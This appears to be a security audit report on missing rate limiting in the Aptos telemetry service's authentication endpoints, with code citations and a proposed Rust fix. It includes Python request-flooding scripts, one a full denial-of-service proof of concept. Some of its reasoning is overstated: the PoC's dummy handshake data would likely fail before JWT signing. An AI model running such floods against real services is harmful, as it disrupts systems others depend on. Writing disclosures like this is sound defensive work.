# Audit Report

## Title
Unbounded Authentication Rate on Telemetry Service Enables Resource Exhaustion via JWT Signing DoS

## Summary
The Aptos telemetry service authentication endpoints lack rate limiting, allowing attackers to flood the `/api/v1/auth` endpoint with unlimited authentication requests. Each request triggers computationally expensive cryptographic operations (noise handshake validation and JWT signing), enabling resource exhaustion attacks that can crash or severely degrade the telemetry service API.

## Finding Description

The `AuthRequest` struct contains no rate limiting fields or mechanisms: [1](#0-0) 

The authentication endpoint is exposed without any rate limiting filter in the routing configuration: [2](#0-1) 

When an authentication request arrives, the `handle_auth` function performs several computationally expensive operations:

1. **Noise handshake cryptographic verification** - Each request requires parsing and validating a noise protocol handshake: [3](#0-2) 

2. **JWT token signing** - After successful handshake validation, the service signs a JWT token using HMAC: [4](#0-3) 

3. **Noise response encryption** - The service encrypts the JWT token in a noise handshake response: [5](#0-4) 

**Attack Path:**
1. Attacker sends millions of HTTP POST requests to `/api/v1/auth` endpoint
2. Each request must be deserialized from JSON (CPU cost)
3. Each request triggers noise handshake parsing and cryptographic verification (high CPU cost)
4. Valid-looking requests trigger JWT signing operations (CPU cost)
5. No rate limiting means unlimited concurrent request processing
6. Server CPU and memory resources become exhausted
7. Telemetry service API becomes unresponsive or crashes

The codebase contains rate limiting infrastructure that could be applied, but it is not used for authentication endpoints: [6](#0-5) 

The custom contract authentication endpoints have the same vulnerability: [7](#0-6) [8](#0-7) 

## Impact Explanation

**Severity: Medium**

This vulnerability breaks the **Resource Limits** invariant (Invariant #9): "All operations must respect gas, storage, and computational limits."

While this is a serious Denial of Service vulnerability, its impact is limited to the telemetry service, which is an auxiliary monitoring service separate from core blockchain operations: [9](#0-8) 

The telemetry service can be disabled and validators continue operating normally. Therefore:

- **NOT Critical**: No consensus impact, no fund loss, blockchain continues operating
- **NOT High**: Does not affect validator node performance (telemetry is separate process)
- **Medium**: API crashes and service disruption requiring intervention to restart

The attack causes:
- CPU exhaustion from cryptographic operations
- Memory exhaustion from request queuing
- Service unavailability for legitimate telemetry collection
- Potential cascading effects if monitoring dashboards depend on telemetry data

## Likelihood Explanation

**Likelihood: HIGH**

This attack is trivial to execute:
- **No authentication required**: The attacker is targeting the authentication endpoint itself
- **Public endpoint**: Telemetry service endpoints are accessible over HTTP(S)
- **Simple tooling**: Standard HTTP clients (curl, Python requests, etc.) can generate flood traffic
- **Low cost**: No special infrastructure needed beyond network bandwidth
- **No special knowledge required**: Endpoint discovery is straightforward

Attack complexity is minimal - a simple script can generate millions of requests:
```python
import requests
import concurrent.futures

def send_auth_request():
    requests.post("https://telemetry.example.com/api/v1/auth", 
                  json={"chain_id": 1, "peer_id": "...", ...})

with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
    futures = [executor.submit(send_auth_request) for _ in range(1000000)]
```

## Recommendation

Implement rate limiting on authentication endpoints using the existing `aptos-rate-limiter` infrastructure:

**Solution 1: Add Warp filter with token bucket rate limiter**
```rust
// In crates/aptos-telemetry-service/src/auth.rs
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;
use std::net::IpAddr;

pub fn auth(context: Context, rate_limiter: Arc<TokenBucketRateLimiter<IpAddr>>) -> BoxedFilter<(impl Reply,)> {
    warp::path!("auth")
        .and(warp::post())
        .and(warp::addr::remote())
        .and_then(move |addr: Option<SocketAddr>| {
            let limiter = rate_limiter.clone();
            async move {
                if let Some(addr) = addr {
                    if !limiter.try_consume(addr.ip(), 1) {
                        return Err(reject::custom(ServiceError::too_many_requests()));
                    }
                }
                Ok(())
            }
        })
        .untuple_one()
        .and(context.filter())
        .and(warp::body::json())
        .and_then(handle_auth)
        .boxed()
}
```

**Solution 2: Add rate limiting fields to configuration**
```rust
// Add to TelemetryServiceConfig
pub struct TelemetryServiceConfig {
    // ... existing fields ...
    
    /// Maximum authentication requests per IP per minute
    pub auth_rate_limit_per_ip: usize,  // e.g., 60
    
    /// Authentication rate limit bucket size
    pub auth_rate_limit_bucket_size: usize,  // e.g., 100
}
```

**Recommended limits:**
- 60 requests per minute per IP address (1 per second sustained)
- Bucket size of 100 for burst tolerance
- Return HTTP 429 (Too Many Requests) when limit exceeded

This protects against both single-source and distributed attacks while allowing legitimate validator authentication.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Telemetry Service Authentication Endpoint DoS
Demonstrates resource exhaustion through unbounded authentication requests.
"""

import requests
import json
import concurrent.futures
import time
import sys

TELEMETRY_URL = "http://telemetry-service:8080/api/v1/auth"
NUM_WORKERS = 500
NUM_REQUESTS = 10000

# Craft a minimal valid-looking AuthRequest
# (actual crypto values don't matter for demonstrating lack of rate limiting)
auth_request = {
    "chain_id": 1,
    "peer_id": "0x" + "00" * 32,
    "role_type": "Validator",
    "server_public_key": "0x" + "00" * 32,
    "handshake_msg": [0] * 64,
    "run_uuid": "00000000-0000-0000-0000-000000000000"
}

def send_auth_request(request_id):
    """Send a single authentication request"""
    try:
        start = time.time()
        response = requests.post(
            TELEMETRY_URL,
            json=auth_request,
            timeout=5
        )
        duration = time.time() - start
        
        return {
            "id": request_id,
            "status": response.status_code,
            "duration": duration,
            "success": True
        }
    except requests.exceptions.Timeout:
        return {"id": request_id, "success": False, "error": "timeout"}
    except requests.exceptions.RequestException as e:
        return {"id": request_id, "success": False, "error": str(e)}

def main():
    print(f"Starting DoS PoC against {TELEMETRY_URL}")
    print(f"Workers: {NUM_WORKERS}, Requests: {NUM_REQUESTS}")
    print("-" * 60)
    
    start_time = time.time()
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
        futures = [
            executor.submit(send_auth_request, i) 
            for i in range(NUM_REQUESTS)
        ]
        
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            result = future.result()
            results.append(result)
            
            if (i + 1) % 100 == 0:
                print(f"Completed: {i + 1}/{NUM_REQUESTS}")
    
    elapsed = time.time() - start_time
    successful = sum(1 for r in results if r.get("success"))
    failed = len(results) - successful
    
    print("-" * 60)
    print(f"Attack completed in {elapsed:.2f} seconds")
    print(f"Successful requests: {successful}")
    print(f"Failed requests: {failed}")
    print(f"Requests/second: {NUM_REQUESTS/elapsed:.2f}")
    
    # Expected outcome: Service becomes unresponsive or crashes
    # due to CPU/memory exhaustion from crypto operations
    if failed > NUM_REQUESTS * 0.5:
        print("\n✓ VULNERABILITY CONFIRMED: Service degraded/crashed")
        print("  More than 50% of requests failed, indicating resource exhaustion")
        return 0
    else:
        print("\n? Service remained responsive - may have external rate limiting")
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

**Expected Result**: The telemetry service becomes unresponsive as CPU resources are exhausted processing cryptographic operations for millions of unauthenticated requests. No HTTP 429 rate limit responses are returned, confirming the absence of rate limiting protection.

## Notes

- This vulnerability affects **only the telemetry service**, not core blockchain consensus or validator operation
- The telemetry service is **optional** and can be disabled without affecting blockchain functionality
- While impact is limited, the vulnerability is **trivially exploitable** and should be fixed
- The same vulnerability exists in **custom contract authentication endpoints** (`/custom-contract/{name}/auth-challenge` and `/custom-contract/{name}/auth`)
- Rate limiting infrastructure exists in the codebase but is **not applied** to authentication endpoints
- Recommended fix uses existing `aptos-rate-limiter` crate with token bucket algorithm
- Should implement **per-IP rate limiting** to handle distributed attacks effectively

### Citations

**File:** crates/aptos-telemetry-service/src/types/auth.rs (L11-21)
```rust
#[derive(Serialize, Deserialize, Debug)]
pub struct AuthRequest {
    pub chain_id: ChainId,
    pub peer_id: PeerId,
    #[serde(default = "default_role_type")]
    pub role_type: RoleType,
    pub server_public_key: x25519::PublicKey,
    pub handshake_msg: Vec<u8>,
    #[serde(default = "default_uuid")]
    pub run_uuid: Uuid,
}
```

**File:** crates/aptos-telemetry-service/src/index.rs (L35-35)
```rust
            .or(auth::auth(context.clone()))
```

**File:** crates/aptos-telemetry-service/src/auth.rs (L55-64)
```rust
    let (remote_public_key, handshake_state, _payload) = context
        .noise_config()
        .parse_client_init_message(&prologue, client_init_message)
        .map_err(|e| {
            debug!("error performing noise handshake: {}", e);
            reject::custom(ServiceError::bad_request(ServiceErrorCode::AuthError(
                AuthError::NoiseHandshakeError(e),
                body.chain_id,
            )))
        })?;
```

**File:** crates/aptos-telemetry-service/src/auth.rs (L153-170)
```rust
    let mut rng = rand::rngs::OsRng;
    let response_payload = token.as_bytes();
    let mut server_response = vec![0u8; noise::handshake_resp_msg_len(response_payload.len())];
    context
        .noise_config()
        .respond_to_client(
            &mut rng,
            handshake_state,
            Some(response_payload),
            &mut server_response,
        )
        .map_err(|e| {
            error!("unable to complete handshake {}", e);
            ServiceError::internal(ServiceErrorCode::AuthError(
                AuthError::NoiseHandshakeError(e),
                body.chain_id,
            ))
        })?;
```

**File:** crates/aptos-telemetry-service/src/jwt_auth.rs (L18-42)
```rust
pub fn create_jwt_token(
    jwt_service: &JsonWebTokenService,
    chain_id: ChainId,
    peer_id: PeerId,
    node_type: NodeType,
    epoch: u64,
    uuid: Uuid,
) -> Result<String, Error> {
    let issued = Utc::now().timestamp();
    let expiration = Utc::now()
        .checked_add_signed(chrono::Duration::minutes(60))
        .expect("valid timestamp")
        .timestamp();

    let claims = Claims {
        chain_id,
        peer_id,
        node_type,
        epoch,
        exp: expiration as usize,
        iat: issued as usize,
        run_uuid: uuid,
    };
    jwt_service.encode(claims)
}
```

**File:** crates/aptos-rate-limiter/src/rate_limit.rs (L54-63)
```rust
pub struct TokenBucketRateLimiter<Key: Eq + Hash + Clone + Debug> {
    label: &'static str,
    log_info: String,
    buckets: RwLock<HashMap<Key, SharedBucket>>,
    new_bucket_start_percentage: u8,
    default_bucket_size: usize,
    default_fill_rate: usize,
    enabled: bool,
    metrics: Option<HistogramVec>,
}
```

**File:** crates/aptos-telemetry-service/src/custom_contract_auth.rs (L61-68)
```rust
pub fn auth_challenge(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("custom-contract" / String / "auth-challenge")
        .and(warp::post())
        .and(context.filter())
        .and(warp::body::json())
        .and_then(handle_auth_challenge)
        .boxed()
}
```

**File:** crates/aptos-telemetry-service/src/custom_contract_auth.rs (L117-124)
```rust
pub fn auth(context: Context) -> BoxedFilter<(impl Reply,)> {
    warp::path!("custom-contract" / String / "auth")
        .and(warp::post())
        .and(context.filter())
        .and(warp::body::json())
        .and_then(handle_auth)
        .boxed()
}
```

**File:** crates/aptos-telemetry/src/service.rs (L124-128)
```rust
    // Don't start the service if telemetry has been disabled
    if telemetry_is_disabled() {
        warn!("Aptos telemetry is disabled!");
        return None;
    }
```
